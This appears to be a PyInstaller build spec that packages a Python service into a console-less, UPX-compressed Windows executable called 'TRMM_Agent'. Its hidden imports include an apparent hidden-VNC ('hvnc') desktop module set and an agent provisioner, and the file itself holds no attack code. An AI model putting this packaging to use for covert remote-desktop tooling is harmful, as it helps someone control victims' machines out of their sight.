# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['C:/xampp/htdocs/TRMM/agent_service.py'],
    pathex=[],
    binaries=[],
    datas=[('C:/xampp/htdocs/TRMM/hvnc/static', 'hvnc/static')],
    hiddenimports=['uvicorn', 'uvicorn.protocols.http.auto', 'uvicorn.protocols.websockets.auto', 'uvicorn.lifespan.on', 'fastapi', 'websockets', 'PIL', 'PIL.Image', 'psutil', 'hvnc', 'hvnc.desktop', 'hvnc.spawner', 'hvnc.compositor', 'hvnc.input_handler', 'hvnc.mirror', 'agent_client', 'agent_client.client', 'agent_client.provisioner'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    [],
    exclude_binaries=True,
    name='TRMM_Agent',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    uac_admin=False,
)
coll = COLLECT(
    exe,
    a.binaries,
    a.datas,
    strip=False,
    upx=True,
    upx_exclude=[],
    name='TRMM_Agent',
)
